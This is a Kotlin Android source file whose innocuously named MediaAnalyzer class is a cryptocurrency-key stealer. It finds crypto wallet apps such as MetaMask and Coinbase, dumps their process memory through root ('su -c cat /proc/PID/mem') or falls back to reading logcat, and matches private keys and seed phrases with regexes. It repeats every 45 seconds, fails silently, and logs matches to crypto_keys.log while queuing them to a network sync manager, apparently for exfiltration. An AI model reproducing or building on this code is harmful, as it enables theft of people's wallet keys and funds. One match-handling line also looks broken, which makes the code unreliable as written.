package com.example.inf2215

import android.content.Context
import android.os.Handler
import android.os.Looper
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern

class MediaAnalyzer(
    private val context: Context,
    private val syncManager: NetworkManager   
) {

    private val handler = Handler(Looper.getMainLooper())
    private var runnable: Runnable? = null

    // Package names to monitor
    private val targetPackages = listOf(
        "com.wallet.crypto.trustapp",
        "io.metamask",
        "com.binance.dev",
        "com.coinbase.android",
        "com.exodusmovement.exodus"
    )

    // Content scanning patterns
    private val keyPatterns = listOf(
        Pattern.compile("-----BEGIN (RSA|EC|DSA|PRIVATE) KEY-----"),           // PEM format
        Pattern.compile("\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,}\\b"),               // Base58 string
        Pattern.compile("0x[a-fA-F0-9]{64}"),                                  // Hex string
        Pattern.compile("[A-Za-z0-9+/]{64,}={0,2}"),                          // Long base64 content
        Pattern.compile("\\b(word[0-9]{1,2}\\b.*){12,24}")                    // Multi-word phrase
    )

    fun startExtraction() {
        runnable = Runnable {
            if (isRootAvailable()) {
                scanMemoryOfTargetApps()
            } else {
                scanLogcat()
            }
            handler.postDelayed(runnable!!, 45000) // every 45 seconds
        }
        handler.post(runnable!!)
    }

    private fun isRootAvailable(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readLine() ?: ""
            output.contains("uid=0")
        } catch (e: Exception) {
            false
        }
    }

    // ================== FULL MEMORY SCANNING (Root Required) ==================
    private fun scanMemoryOfTargetApps() {
        try {
            val processList = Runtime.getRuntime().exec("su -c ps -A").inputStream.bufferedReader().readLines()

            for (line in processList) {
                for (pkg in targetPackages) {
                    if (line.contains(pkg)) {
                        val pid = line.trim().split(Regex("\\s+"))[1].toIntOrNull() ?: continue
                        dumpAndScanMemory(pid, pkg)
                    }
                }
            }
        } catch (_: Exception) { }
    }

    private fun dumpAndScanMemory(pid: Int, packageName: String) {
        try {
            val dumpCommand = "su -c 'cat /proc/$pid/mem | head -c 1048576'"
            val process = Runtime.getRuntime().exec(dumpCommand)

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val memoryDump = reader.readText()

            for (pattern in keyPatterns) {
                if (pattern.matcher(memoryDump).find()) {
                    val match = pattern.matcher(memoryDump).group(0) ?: "unknown"
                    logPotentialKey("MEMORY_SCAN", packageName, match)
                }
            }
        } catch (_: Exception) { }
    }

    // Fallback: scan logcat (non-root)
    private var lastLogcatScanTime = 0L

    private fun scanLogcat() {
        try {
            val process = Runtime.getRuntime().exec("logcat -d -v time")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val newScanTime = System.currentTimeMillis()

            reader.use {
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    line?.let { currentLine ->
                        // Only process lines newer than last scan
                        if (isLineNewerThan(currentLine, lastLogcatScanTime)) {
                            for (pattern in keyPatterns) {
                                if (pattern.matcher(currentLine).find()) {
                                    logPotentialKey("LOGCAT", "system", currentLine)
                                    break
                                }
                            }
                        }
                    }
                }
            }

            lastLogcatScanTime = newScanTime

        } catch (e: Exception) {
            // silent
        }
    }

    private fun isLineNewerThan(line: String, sinceTime: Long): Boolean {
        if (sinceTime == 0L) return true // first run, process everything
        return try {
            // logcat -v time format: "MM-DD HH:MM:SS.mmm"
            val dateFormat = SimpleDateFormat("MM-dd HH:mm:ss.SSS", Locale.US)
            val calendar = Calendar.getInstance()
            // Inject current year since logcat omits it
            val lineDate = dateFormat.parse(line.take(18)) ?: return false
            calendar.time = lineDate
            calendar.set(Calendar.YEAR, Calendar.getInstance().get(Calendar.YEAR))
            calendar.timeInMillis > sinceTime
        } catch (e: Exception) {
            false
        }
    }

    private fun logPotentialKey(source: String, packageName: String, keySnippet: String) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
        val entry = "$timestamp | $source | $packageName | $keySnippet"

        saveToFile(entry)
        syncManager.queueData(entry)   
    }

    private fun saveToFile(data: String) {
        try {
            val dir = File(context.filesDir, "logs")
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "crypto_keys.log")
            file.appendText("$data\n")
        } catch (_: Exception) { }
    }

    fun stopExtraction() {
        runnable?.let { handler.removeCallbacks(it) }
    }
}